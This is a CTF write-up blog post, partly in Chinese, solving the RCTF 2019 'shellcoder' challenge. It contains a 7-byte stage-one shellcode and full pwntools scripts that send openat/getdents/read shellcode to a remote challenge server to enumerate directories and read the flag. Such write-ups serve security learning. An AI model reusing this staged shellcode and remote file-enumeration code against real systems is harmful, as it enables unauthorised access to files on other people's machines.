---
title: RCTF2019_shellcoder
date: 2019-05-21 19:42:59
tags: shellcode
---
syscall : getdents & sys_openat
<--!more-->
# Start
I did not get the flag in the competition ...Because I traveled in contrary directions.
...
[binary][1]
# analysis
This a statically linked binary .

We need to exploit it by 7 byte-shellcode

It sets registers before executing our `shellcode`.
And the registers  looks like :
```sh
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x7fbfb603e000 ◂— xchg   rdi, rsi /* 0xf4050ff289f78748 */
 RSI  0x0
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x0
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x0
 RSP  0x7ffd336c3908 ◂— 0xabadc0defee1dead
 RIP  0x56029c8e74c7 ◂— jmp    rdi
```
At the begin, I thought that we can not exploit it by 7 bytes so I tried so many ways to reuse the func by using the data on stack.
But ...failed 

In fact ,we can call sys_read by shellcode like:
```asm
exchg rdi,rsi
mov esi,esx
syscall
```

so we will have enough space for our shellcode.
But we can't locate the flag, there is no libc for us , what we have is shellcode.

## Ls
I straced `ls`:
`strace -o ls ls`

```s
$ cat ls
...
openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
getdents(3, /* 24 entries */, 32768)    = 752
getdents(3, /* 0 entries */, 32768)     = 0
...
+++ exited with 0 +++
``` 
...

```c
int getdents(int fildes, struct dirent *buf, size_t nbyte);
int __openat (int fd, const char *file, int oflag, ...);
```
...
发现我的英文真烂 真他妈难表达。。。换用中文缓和一下心情。
所以我开始尝试使用257号和78号系统调用来实现定位`flag`

## openat
`openat` 用于打开目录
按照使用说明设置好寄存器发现成功返回了文件指针
```asm
mov ax,0x101
mov rdi,-101
mov rsi,0x67616c662f2e
push rsi
mov rsi,rsp
mov rdx,0
mov r10,0
syscall
```
## getdents

`getdents`用于读取目录内容使用起来比较容易设置好参数就可以不过比较惨的是返回值需要自己去解析.

看了半天源码解析部分看不太明白，结构体部分还是挺有用的
```c
struct dirent
  {
#ifndef __USE_FILE_OFFSET64
    __ino_t d_ino;
    __off_t d_off;
#else
    __ino64_t d_ino;
    __off64_t d_off;
#endif
    unsigned short int d_reclen;
    unsigned char d_type;
    char d_name[256];                /* We must not include limits.h! */
  };
#ifdef __USE_LARGEFILE64
struct dirent64
  {
    __ino64_t d_ino;
    __off64_t d_off;
    unsigned short int d_reclen;
    unsigned char d_type;
    char d_name[256];                /* We must not include limits.h! */
  };
#endif
```
还有类型的宏定义
```c
enum
  {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN        DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO        DT_FIFO
    DT_CHR = 2,
# define DT_CHR                DT_CHR
    DT_DIR = 4,
# define DT_DIR                DT_DIR
    DT_BLK = 6,
# define DT_BLK                DT_BLK
    DT_REG = 8,
# define DT_REG                DT_REG
    DT_LNK = 10,
# define DT_LNK                DT_LNK
    DT_SOCK = 12,
# define DT_SOCK        DT_SOCK
    DT_WHT = 14
# define DT_WHT                DT_WHT
  };
```
于是我就按照上述定义结合结构体去解析返回值
(上述结构体有些地方不准确需要按照实际返回来猜测。。。)
我们需要的是文件夹名和文件名为此我们需要得到
```c
d_reclen(off=0x10)
d_name(off=0x12)
d_type(off=d_reclen-1)
```
所以尝试遍历目录的解析函数
```python
from pwn import *
def getend(n):
	idx=0
	for x in n:
		if x=='\x00':
			return idx	
		idx+=1
	return -1
def getinfo(data):
	d=0
	while(d<len(data)):
		reclen=ord(data[d+0x10])
		if reclen == 0:
			return 
		dtype=ord(data[d+reclen-1])
		namelen=getend(data[d+0x12:])
		if dtype==4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			log.warning("%s",data[d+0x12:d+0x12+namelen])
		d+=reclen
	
```
所以搞了个辣鸡遍历...
```python
from pwn import *
def getend(n):
	idx=0
	for x in n:
		if x=='\x00':
			return idx	
		idx+=1
	return -1
def getinfo(data,flag=0):
	d=0
	res=[]
	f=[]
	while(d<len(data)):
		reclen=ord(data[d+0x10])
		if reclen == 0:
			break 
		dtype=ord(data[d+reclen-1])
		namelen=getend(data[d+0x12:])
		if dtype==4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			res.append(data[d+0x12:d+0x12+namelen])
			#log.warning("DIR:%s",data[d+0x12:d+0x12+namelen])
		elif dtype!=4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			f.append(data[d+0x12:d+0x12+namelen])
		d+=reclen
	return res,f
def push_path(path):
	d=0
	l=len(path)
	path+=(-l%8)*'\x00'
	pad='''
	mov rsi,{}
	push rsi	
	'''
	res=''
	while(d<len(path)):
		res=pad.format(hex(u64(path[d:d+8])))+res
		d+=8
	return res
def exp(seek,flag=0):	
	#context.log_level='debug'
	#p=process('./shellcoder')
	#gdb.attach(p)
	p=remote("139.180.215.222",20002)
	context.arch='amd64'
	sh='''
	xchg rdi,rsi
	mov edx,esi
	syscall
	'''
	sh=asm(sh)
	p.sendafter(":",sh)


	#print push_path("./flag")
	#raw_input()
	sh='''
	mov ax,0x101
	mov rdi,-0x64
	{}
	mov rsi,rsp
	mov rdx,0
	mov r10,0
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x200
	xor rax,rax
	mov al,78
	syscall

	mov rdi,1
	mov rsi,rsp
	mov rdx,0x400
	xor rax,rax
	mov al,1
	syscall
	'''.format(push_path(seek))
	p.send("\x90"*0x7+asm(sh))
	data=p.read()
	r,f=getinfo(data,flag)
	p.close()
	return r,f

def fuck(path):
	print path
	try:
		res,f=exp(path)
		if res==[] and "flag" in f:
			print "[+]"+path
		elif res!=[]:
			for x in res:
				fuck(path+x+"/")
		return

	except:
		return 

fuck("./flag/rrfh/")
```
Ten Years Later...

I get the path !:`./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag`
# EXP
```python
from pwn import *
def getend(n):
	idx=0
	for x in n:
		if x=='\x00':
			return idx	
		idx+=1
	return -1
def getinfo(data,flag=0):
	d=0
	res=[]
	f=[]
	while(d<len(data)):
		reclen=ord(data[d+0x10])
		if reclen == 0:
			break 
		dtype=ord(data[d+reclen-1])
		namelen=getend(data[d+0x12:])
		if dtype==4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			res.append(data[d+0x12:d+0x12+namelen])
		elif dtype!=4 and data[d+0x12:d+0x12+namelen]!="." and data[d+0x12:d+0x12+namelen]!="..":
			f.append(data[d+0x12:d+0x12+namelen])
		d+=reclen
	return res,f
def push_path(path):
	d=0
	l=len(path)
	path+=(-l%8)*'\x00'
	pad='''
	mov rsi,{}
	push rsi	
	'''
	res=''
	while(d<len(path)):
		res=pad.format(hex(u64(path[d:d+8])))+res
		d+=8
	return res
def exp(seek,flag=0):	
	#context.log_level='debug'
	#p=process('./shellcoder')
	#gdb.attach(p)
	p=remote("139.180.215.222",20002)
	context.arch='amd64'
	sh='''
	xchg rdi,rsi
	mov edx,esi
	syscall
	'''
	sh=asm(sh)
	p.sendafter(":",sh)


	#print push_path("./flag")
	#raw_input()
	sh='''
	mov ax,0x101
	mov rdi,-0x64
	{}
	mov rsi,rsp
	mov rdx,0
	mov r10,0
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x200
	xor rax,rax
	mov al,78
	syscall

	mov rdi,1
	mov rsi,rsp
	mov rdx,0x400
	xor rax,rax
	mov al,1
	syscall
	'''.format(push_path(seek))
	p.send("\x90"*0x7+asm(sh))
	data=p.read()
	p.close()
	r,f=getinfo(data,flag)
	p.close()
	return r,f

def fuck(path):
	print path
	try:
		res,f=exp(path)
		#print f
		if res==[] and "flag" in f:
			log.warning(path)
		elif res!=[]:
			for x in res:
				fuck(path+x+"/flag")
		return

	except:
		return 
def exploit(seek,flag=0):
	p=remote("139.180.215.222",20002)
	context.arch='amd64'
	sh='''
	xchg rdi,rsi
	mov edx,esi
	syscall
	'''
	sh=asm(sh)
	p.sendafter(":",sh)
	sh='''
	mov ax,2
	{}
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x30
	xor rax,rax
	syscall

	mov rdi,1
	mov rsi,rsp
	mov rdx,0x30
	xor rax,rax
	mov al,1
	syscall
	'''.format(push_path(seek))
	p.send("\x90"*0x7+asm(sh))
	data=p.read()
	p.close()
	print data

#fuck("/flag")
exploit("./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag")
#rctf{1h48iegin3egh8dc5ihu}
```


# Summery

发现虽然做了挺多shellcode但是脑子还是不太好使...第一部分都过不去虽然第二部分只是纯粹的写爆破代码+shellcode to fetch path ...

挺不错的一题挺有意思的。

[1]:
[2]: https://cloud.tencent.com/developer/article/1143454